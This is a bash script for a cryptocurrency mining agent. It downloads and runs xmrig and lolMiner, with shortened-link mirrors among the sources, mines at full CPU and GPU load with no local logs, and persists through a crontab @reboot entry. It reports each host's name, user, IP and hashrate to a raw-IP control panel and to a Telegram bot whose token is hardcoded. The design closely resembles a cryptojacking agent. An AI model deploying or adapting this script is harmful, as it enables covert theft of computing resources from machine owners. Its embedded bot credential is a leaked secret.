#!/bin/bash
# MINING AGENT v5.0 — MAXIMUM UPTIME & PERFORMANCE
# Supports CPU (XMR/RandomX) + GPU (ETCHASH/KAWPOW) via lolMiner/xmrig/miniZ
# Zero local logs, panel heartbeat, critical Telegram alerts only.
# Launch: ALLOW_MINING=1 bash agent.sh
set -u

#############################################
# CONFIGURATION (customize if needed)
#############################################
ALLOW_MINING="${ALLOW_MINING:-0}"
TEST_MODE="${TEST_MODE:-0}"
INTERVAL="${INTERVAL:-60}"                # watchdog loop interval (sec)
HEARTBEAT_INTERVAL="${HEARTBEAT_INTERVAL:-300}"  # panel heartbeat interval (sec)
INSTALL_RETRIES="${INSTALL_RETRIES:-5}"
DOWNLOAD_TIMEOUT="${DOWNLOAD_TIMEOUT:-45}"
MAX_RESTARTS_BEFORE_REINSTALL="${MAX_RESTARTS_BEFORE_REINSTALL:-3}"
RESTART_WINDOW_SECONDS="${RESTART_WINDOW_SECONDS:-3600}"
REINSTALL_COOLDOWN="${REINSTALL_COOLDOWN:-1800}"

# Panel settings
PANEL_BASE_URL="${PANEL_BASE_URL:-http://31.76.50.139}"
HEARTBEAT_ENDPOINT="${HEARTBEAT_ENDPOINT:-/api/heartbeat}"
LOGS_ENDPOINT="${LOGS_ENDPOINT:-/api/logs/push}"
PANEL_USERNAME="${PANEL_USERNAME:-$(whoami)}"

# Telegram (CRITICAL ONLY)
TG_TOKEN="8988269300:AAGoB3_S3GtGCDYqAYXVjkowIW3fce-Hq8g"
TG_CHAT="5336452267"
TG_API="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"

# Kryptex Account
KRIPTEX="krxX3PVQVR"

# Pools (choose your main algorithms)
XMR_POOL="xmr.kryptex.network:7029"      # CPU RandomX
ETC_POOL="etc.kryptex.network:7033"      # GPU ETCHASH
RVN_POOL="rvn.kryptex.network:6013"      # GPU KAWPOW (optional)

# GPU algorithm – change to KAWPOW if you want RVN
GPU_ALGO="${GPU_ALGO:-ETCHASH}"

# Paths
BASE="${HOME}/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
PID_CPU="$RUN/cpu.pid"
PID_GPU="$RUN/gpu.pid"
STATE_CPU="$RUN/cpu.state"
STATE_GPU="$RUN/gpu.state"
AGENT_LOCK="/tmp/mining_agent.lock"

#############################################
# DEPENDENCY CHECK
#############################################

command_exists() { command -v "$1" >/dev/null 2>&1; }

ensure_http_client() {
  command_exists curl && { HTTP_CLIENT="curl"; return 0; }
  command_exists wget && { HTTP_CLIENT="wget"; return 0; }
  command_exists busybox && { HTTP_CLIENT="busybox"; return 0; }
  return 1
}

http_get() {
  _url="$1"; _timeout="${2:-$DOWNLOAD_TIMEOUT}"
  case "$HTTP_CLIENT" in
    curl) curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/5.0" --retry 2 --retry-delay 3 "$_url" 2>/dev/null ;;
    wget) wget -qO- --timeout="$_timeout" --user-agent="MiningAgent/5.0" --tries=2 "$_url" 2>/dev/null ;;
    busybox) busybox wget -qO- -T "$_timeout" "$_url" 2>/dev/null ;;
    *) return 1 ;;
  esac
}

download_file() {
  _out="$1"; _url="$2"; _timeout="${3:-$DOWNLOAD_TIMEOUT}"
  case "$HTTP_CLIENT" in
    curl) curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/5.0" --retry 2 --retry-delay 3 -o "$_out" "$_url" 2>/dev/null ;;
    wget) wget -q --timeout="$_timeout" --user-agent="MiningAgent/5.0" --tries=2 -O "$_out" "$_url" 2>/dev/null ;;
    busybox) busybox wget -T "$_timeout" -O "$_out" "$_url" 2>/dev/null ;;
    *) return 1 ;;
  esac
  [ -s "$_out" ] && return 0 || return 1
}

#############################################
# SYSTEM DETECTION
#############################################

get_arch() {
  _arch=$(uname -m 2>/dev/null || echo "x86_64")
  case "$_arch" in
    x86_64|x64|amd64) echo "x64" ;;
    aarch64|arm64) echo "arm64" ;;
    armv7l|armhf) echo "arm" ;;
    *) echo "x64" ;;
  esac
}

check_disk_space() {
  _required_mb="${1:-100}"
  _available=$(df -m "$BASE" 2>/dev/null | tail -1 | awk '{print $4}')
  [ "${_available:-0}" -ge "$_required_mb" ] && return 0 || return 1
}

has_gpu() {
  (command_exists lspci && lspci 2>/dev/null | grep -qiE 'vga|3d|display') ||
  (command_exists nvidia-smi) ||
  (command_exists rocm-smi) ||
  (find /dev/dri -name 'card*' 2>/dev/null | head -1)
}

get_report_ip() {
  for _src in \
    "https://api.ipify.org" \
    "https://ifconfig.me/ip" \
    "https://icanhazip.com" \
    "https://ident.me" \
    "https://ipinfo.io/ip" \
    "https://api.ip.sb/ip"
  do
    _ip=$(http_get "$_src" 15 2>/dev/null | tr -d '[:space:]' | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | head -1)
    [ -n "$_ip" ] && [ "$_ip" != "127.0.0.1" ] && echo "$_ip" && return 0
  done
  _local_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
  [ -n "$_local_ip" ] && [ "$_local_ip" != "127.0.0.1" ] && echo "$_local_ip" && return 0
  echo "0.0.0.0"
}

get_node_id() {
  [ "$TEST_MODE" = "1" ] && echo "TEST" && return
  hostname 2>/dev/null || echo "UNKNOWN"
}

#############################################
# PROCESS MANAGEMENT
#############################################

is_alive() {
  _pidfile="$1"; _name="$2"
  [ -f "$_pidfile" ] && _pid=$(cat "$_pidfile" 2>/dev/null) && [ -n "$_pid" ] && kill -0 "$_pid" 2>/dev/null && return 0
  command_exists pgrep && pgrep -f "$_name" >/dev/null 2>&1 && return 0
  ps aux 2>/dev/null | grep -v grep | grep -q "$_name" && return 0
  return 1
}

kill_miner() {
  _name="$1"
  command_exists pkill && pkill -f "$_name" 2>/dev/null || true
  command_exists killall && killall "$_name" 2>/dev/null || true
  sleep 1
}

#############################################
# RESTART TRACKING
#############################################

init_state() { [ -f "$1" ] || echo "0|0|0" > "$1"; }
get_state_field() { [ -f "$1" ] && cut -d'|' -f"$2" "$1" 2>/dev/null || echo "0"; }

update_restart_state() {
  _statefile="$1"; _now=$(date +%s)
  _count=$(get_state_field "$_statefile" 1)
  _last=$(get_state_field "$_statefile" 2)
  _last_reinstall=$(get_state_field "$_statefile" 3)
  if [ $((_now - _last)) -gt "$RESTART_WINDOW_SECONDS" ]; then _count=0; fi
  _count=$((_count + 1))
  echo "${_count}|${_now}|${_last_reinstall}" > "$_statefile"
  echo "$_count"
}

should_reinstall() {
  _statefile="$1"; _count=$(update_restart_state "$_statefile")
  _last_reinstall=$(get_state_field "$_statefile" 3)
  _now=$(date +%s)
  [ $((_now - _last_reinstall)) -lt "$REINSTALL_COOLDOWN" ] && return 1
  [ "$_count" -ge "$MAX_RESTARTS_BEFORE_REINSTALL" ] && return 0 || return 1
}

reset_restart_state() { echo "0|0|$(date +%s)" > "$1"; }

#############################################
# INSTALLERS (MAXIMUM MIRRORS & FALLBACKS)
#############################################

install_xmrig() {
  kill_miner "xmrig"
  rm -f "$BIN/cpu/xmrig" 2>/dev/null
  rm -rf "$BIN/cpu/xmrig"* 2>/dev/null
  _arch=$(get_arch)
  _mirrors="
    https://xmrig.com/download/xmrig-6.25.0-linux-static-${_arch}.tar.gz
    https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-${_arch}.tar.gz
    https://gitlab.com/xmrig/xmrig/-/releases/v6.25.0/downloads/xmrig-6.25.0-linux-static-${_arch}.tar.gz
    https://mirror.xmrig.com/xmrig-6.25.0-linux-static-${_arch}.tar.gz
    https://cdn.xmrig.com/xmrig-6.25.0-linux-static-${_arch}.tar.gz
  "
  _attempt=1
  while [ $_attempt -le "$INSTALL_RETRIES" ]; do
    for _url in $_mirrors; do
      if download_file "/tmp/xmrig.tgz" "$_url" 45; then
        mkdir -p "$BIN/cpu" 2>/dev/null
        if tar -xzf /tmp/xmrig.tgz -C "$BIN/cpu" --strip-components=1 2>/dev/null; then
          chmod +x "$BIN/cpu/xmrig" 2>/dev/null
          if [ -x "$BIN/cpu/xmrig" ] && "$BIN/cpu/xmrig" --version >/dev/null 2>&1; then
            rm -f /tmp/xmrig.tgz 2>/dev/null
            return 0
          fi
        fi
      fi
      rm -f /tmp/xmrig.tgz 2>/dev/null
    done
    _attempt=$((_attempt + 1))
    [ $_attempt -le "$INSTALL_RETRIES" ] && sleep 5
  done
  return 1
}

install_lolminer() {
  kill_miner "lolMiner"
  rm -f "$BIN/gpu/lolMiner" 2>/dev/null
  rm -rf "$BIN/gpu/1.98" 2>/dev/null
  _mirrors="
    https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz
    https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz
    https://www.lorexxar.ch/lolminer/lolMiner_v1.98_Lin64.tar.gz
    https://bit.ly/lolminer198
    https://tinyurl.com/lolminer198
    https://github.com/Lolliedieb/lolMiner-releases/releases/latest/download/lolMiner_v1.98_Lin64.tar.gz
  "
  _attempt=1
  while [ $_attempt -le "$INSTALL_RETRIES" ]; do
    for _url in $_mirrors; do
      if download_file "/tmp/lolminer.tgz" "$_url" 45; then
        mkdir -p "$BIN/gpu" 2>/dev/null
        if tar -xzf /tmp/lolminer.tgz -C "$BIN/gpu" 2>/dev/null; then
          # Find the extracted directory (usually 1.98 or similar)
          _extracted_dir=$(find "$BIN/gpu" -maxdepth 1 -type d -name "1.*" | head -1)
          if [ -n "$_extracted_dir" ]; then
            mv "$_extracted_dir"/* "$BIN/gpu/" 2>/dev/null
            rm -rf "$_extracted_dir" 2>/dev/null
          fi
          chmod +x "$BIN/gpu/lolMiner" 2>/dev/null
          if [ -x "$BIN/gpu/lolMiner" ] && "$BIN/gpu/lolMiner" --version >/dev/null 2>&1; then
            rm -f /tmp/lolminer.tgz 2>/dev/null
            return 0
          fi
        fi
      fi
      rm -f /tmp/lolminer.tgz 2>/dev/null
    done
    _attempt=$((_attempt + 1))
    [ $_attempt -le "$INSTALL_RETRIES" ] && sleep 5
  done
  return 1
}

install_miniz() {
  # Fallback for Kaspa/kHeavyHash or KAWPOW
  kill_miner "miniz"
  rm -f "$BIN/gpu/miniz" 2>/dev/null
  _mirrors="
    https://github.com/miniz-mining/miniz/releases/download/v3.2pl1/miniz-3.2pl1-x64-linux.tar.gz
    https://miniz.ch/download/miniz-3.2pl1-x64-linux.tar.gz
    https://github.com/miniz-mining/miniz/releases/latest/download/miniz-3.2pl1-x64-linux.tar.gz
  "
  for _url in $_mirrors; do
    if download_file "/tmp/miniz.tar.gz" "$_url" 45; then
      mkdir -p "$BIN/gpu" 2>/dev/null
      if tar -xzf /tmp/miniz.tar.gz -C "$BIN/gpu" 2>/dev/null; then
        chmod +x "$BIN/gpu/miniz" 2>/dev/null
        [ -x "$BIN/gpu/miniz" ] && { rm -f /tmp/miniz.tar.gz; return 0; }
      fi
      rm -f /tmp/miniz.tar.gz 2>/dev/null
    fi
  done
  return 1
}

#############################################
# MINER STARTERS (FULL RESOURCE USAGE)
#############################################

start_cpu() {
  is_alive "$PID_CPU" "xmrig" && return 0
  _retry=1
  while [ $_retry -le 3 ]; do
    # Use all CPU cores with maximum performance hints
    "$BIN/cpu/xmrig" \
      -o "$XMR_POOL" \
      -u "$KRIPTEX.$(get_node_id)" -p x \
      --algo randomx \
      --http-enabled --http-host 127.0.0.1 --http-port 16000 \
      --cpu-max-threads-hint=100 \
      --no-cpu-affinity \
      --donate-level 0 \
      --tls >/dev/null 2>&1 &
    echo $! > "$PID_CPU"
    sleep 4
    is_alive "$PID_CPU" "xmrig" && return 0
    _retry=$((_retry + 1))
    sleep 2
  done
  return 1
}

start_gpu() {
  is_alive "$PID_GPU" "lolMiner" && return 0
  _retry=1
  while [ $_retry -le 3 ]; do
    case "$GPU_ALGO" in
      ETCHASH)
        "$BIN/gpu/lolMiner" \
          --algo ETCHASH \
          --pool "$ETC_POOL" \
          --user "$KRIPTEX.$(get_node_id)" \
          --ethstratum ETCPROXY \
          --apihost 127.0.0.1 --apiport 8080 \
          --watchdog exit \
          --tls on \
          --devices AUTO >/dev/null 2>&1 &
        ;;
      KAWPOW)
        "$BIN/gpu/lolMiner" \
          --algo KAWPOW \
          --pool "$RVN_POOL" \
          --user "$KRIPTEX.$(get_node_id)" \
          --apihost 127.0.0.1 --apiport 8080 \
          --watchdog exit \
          --tls on \
          --devices AUTO >/dev/null 2>&1 &
        ;;
      *)
        # Fallback to ETCHASH
        "$BIN/gpu/lolMiner" \
          --algo ETCHASH \
          --pool "$ETC_POOL" \
          --user "$KRIPTEX.$(get_node_id)" \
          --ethstratum ETCPROXY \
          --apihost 127.0.0.1 --apiport 8080 \
          --watchdog exit \
          --tls on \
          --devices AUTO >/dev/null 2>&1 &
        ;;
    esac
    echo $! > "$PID_GPU"
    sleep 6
    is_alive "$PID_GPU" "lolMiner" && return 0
    _retry=$((_retry + 1))
    sleep 3
  done
  return 1
}

#############################################
# AUTOSTART
#############################################

ensure_autostart() {
  _script_path="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
  _entry="@reboot ALLOW_MINING=1 bash $_script_path"
  _current=$(crontab -l 2>/dev/null || echo "")
  if ! echo "$_current" | grep -qF "$_script_path"; then
    (echo "$_current"; echo "$_entry") | crontab - 2>/dev/null || true
  fi
}

#############################################
# TELEGRAM (CRITICAL ONLY)
#############################################

tg() {
  _text="$1"
  if command_exists curl; then
    curl -s --connect-timeout 10 -m 20 -X POST "$TG_API" \
      -d chat_id="$TG_CHAT" \
      --data-urlencode text="$_text" >/dev/null 2>&1 || true
  elif command_exists wget; then
    wget -q --timeout=10 -O- --post-data="chat_id=$TG_CHAT&text=$(printf '%s' "$_text" | sed 's/&/%26/g')" \
      "$TG_API" >/dev/null 2>&1 || true
  fi
}

#############################################
# PANEL COMMUNICATION
#############################################

send_heartbeat() {
  _msg="$1"
  _data=$(cat <<EOF
{
  "username": "$PANEL_USERNAME",
  "ip": "$REPORT_IP",
  "event": "heartbeat",
  "run_id": "$RUN_ID",
  "message": "${_msg:0:1500}"
}
EOF
)
  _url="${PANEL_BASE_URL}${HEARTBEAT_ENDPOINT}"
  if command_exists curl; then
    curl -s --connect-timeout 5 -m 10 -X POST "$_url" \
      -H "Content-Type: application/json" \
      -d "$_data" >/dev/null 2>&1
  elif command_exists wget; then
    wget --timeout=10 -qO- --post-data="$_data" --header="Content-Type: application/json" "$_url" >/dev/null 2>&1
  fi
}

send_log() {
  _event="${1:-log}"
  _message="${2:-}"
  _event=$(echo "$_event" | tr '[:upper:]' '[:lower:]' | cut -c1-64)
  _msg_trimmed="${_message:0:1500}"
  _data=$(cat <<EOF
{
  "username": "$PANEL_USERNAME",
  "ip": "$REPORT_IP",
  "event": "$_event",
  "run_id": "$RUN_ID",
  "message": "$_msg_trimmed"
}
EOF
)
  _url="${PANEL_BASE_URL}${LOGS_ENDPOINT}"
  if command_exists curl; then
    curl -s --connect-timeout 5 -m 10 -X POST "$_url" \
      -H "Content-Type: application/json" \
      -d "$_data" >/dev/null 2>&1
  elif command_exists wget; then
    wget --timeout=10 -qO- --post-data="$_data" --header="Content-Type: application/json" "$_url" >/dev/null 2>&1
  fi
}

heartbeat() {
  _cpu_ok="0"; is_alive "$PID_CPU" "xmrig" && _cpu_ok="1"
  _gpu_ok="0"; is_alive "$PID_GPU" "lolMiner" && _gpu_ok="1"
  _cpu_hr=$(get_cpu_hashrate)
  _gpu_hr=$(get_gpu_hashrate)
  _uptime=$(get_uptime)
  _msg="CPU:${_cpu_ok} (${_cpu_hr} H/s) GPU:${_gpu_ok} (${_gpu_hr} H/s) Up:${_uptime}s IP:${REPORT_IP}"
  send_heartbeat "$_msg"
}

get_uptime() {
  awk '{printf "%d",$1}' /proc/uptime 2>/dev/null || echo "0"
}

get_cpu_hashrate() {
  http_get "http://127.0.0.1:16000/1/summary" 5 2>/dev/null | grep -oE '"hashrate":\s*[0-9.]+' | grep -oE '[0-9.]+' | head -1 || echo "0"
}

get_gpu_hashrate() {
  http_get "http://127.0.0.1:8080/summary" 5 2>/dev/null | grep -oE '"Performance":\s*[0-9.]+' | grep -oE '[0-9.]+' | head -1 || echo "0"
}

#############################################
# RECOVERY
#############################################

recover_cpu() {
  if should_reinstall "$STATE_CPU"; then
    send_log "reinstall" "CPU miner unstable, reinstalling"
    reset_restart_state "$STATE_CPU"
    install_xmrig && start_cpu && send_log "info" "CPU reinstall OK" || send_log "error" "CPU reinstall failed"
  else
    start_cpu || true
  fi
}

recover_gpu() {
  if should_reinstall "$STATE_GPU"; then
    send_log "reinstall" "GPU miner unstable, reinstalling"
    reset_restart_state "$STATE_GPU"
    if install_lolminer; then
      start_gpu && send_log "info" "GPU reinstall (lolMiner) OK"
    else
      install_miniz && start_gpu && send_log "info" "GPU reinstall (miniZ) OK" || send_log "error" "GPU reinstall failed"
    fi
  else
    start_gpu || true
  fi
}

#############################################
# LOCK
#############################################

acquire_lock() {
  if [ -f "$AGENT_LOCK" ]; then
    _pid=$(cat "$AGENT_LOCK" 2>/dev/null)
    if kill -0 "$_pid" 2>/dev/null; then exit 1; fi
    rm -f "$AGENT_LOCK"
  fi
  echo $$ > "$AGENT_LOCK"
  trap "rm -f $AGENT_LOCK" EXIT
}

#############################################
# MAIN
#############################################

main() {
  [ "$ALLOW_MINING" = "1" ] || exit 0
  acquire_lock

  mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" 2>/dev/null || exit 1
  ensure_http_client || {
    tg "❌ No HTTP client on $(hostname)"
    exit 1
  }

  NODE_ID=$(get_node_id)
  REPORT_IP=$(get_report_ip)
  RUN_ID="${NODE_ID}-$(date +%s)-$$"
  _arch=$(get_arch)

  tg "🟢 Mining agent starting on ${NODE_ID} (${REPORT_IP}) | RunID: ${RUN_ID}"

  init_state "$STATE_CPU"
  init_state "$STATE_GPU"

  if ! check_disk_space 200; then
    tg "❌ No disk space on ${NODE_ID} (${REPORT_IP})"
    send_log "error" "No disk space"
    exit 1
  fi

  GPU_ENABLED=0
  has_gpu && GPU_ENABLED=1

  _cpu_ok=0
  if [ ! -x "$BIN/cpu/xmrig" ]; then
    install_xmrig && _cpu_ok=1
  else
    _cpu_ok=1
  fi

  _gpu_ok=0
  if [ "$GPU_ENABLED" = "1" ]; then
    if [ ! -x "$BIN/gpu/lolMiner" ]; then
      if install_lolminer; then
        _gpu_ok=1
      else
        install_miniz && _gpu_ok=1
      fi
    else
      _gpu_ok=1
    fi
  fi

  ensure_autostart

  [ "$_cpu_ok" = "1" ] && start_cpu
  [ "$_gpu_ok" = "1" ] && start_gpu

  sleep 10

  if [ "$_cpu_ok" = "1" ] || [ "$_gpu_ok" = "1" ]; then
    _status="CPU:${_cpu_ok} GPU:${_gpu_ok} algo=${GPU_ALGO}"
    tg "✅ Mining active on ${NODE_ID} (${REPORT_IP}) | ${_status} | RunID: ${RUN_ID}"
    send_log "info" "Mining started: ${_status}"
  else
    tg "❌ Mining setup FAILED on ${NODE_ID} (${REPORT_IP}) | RunID: ${RUN_ID}"
    send_log "error" "Mining setup failed"
    exit 1
  fi

  _last_heartbeat=0
  while true; do
    [ "$_cpu_ok" = "1" ] && ! is_alive "$PID_CPU" "xmrig" && recover_cpu
    [ "$_gpu_ok" = "1" ] && ! is_alive "$PID_GPU" "lolMiner" && recover_gpu

    if [ "$_gpu_ok" = "1" ]; then
      _hr=$(get_gpu_hashrate)
      if [ "$_hr" = "0" ]; then
        sleep 20
        _hr2=$(get_gpu_hashrate)
        if [ "$_hr2" = "0" ]; then
          if should_reinstall "$STATE_GPU"; then
            send_log "reinstall" "GPU zero HR, reinstalling"
            reset_restart_state "$STATE_GPU"
            install_lolminer && start_gpu || true
          else
            update_restart_state "$STATE_GPU" >/dev/null
            start_gpu || true
          fi
        fi
      fi
    fi

    _now=$(date +%s)
    if [ $((_now - _last_heartbeat)) -ge "$HEARTBEAT_INTERVAL" ]; then
      heartbeat
      _last_heartbeat=$_now
    fi

    sleep "$INTERVAL"
  done
}

main "$@"
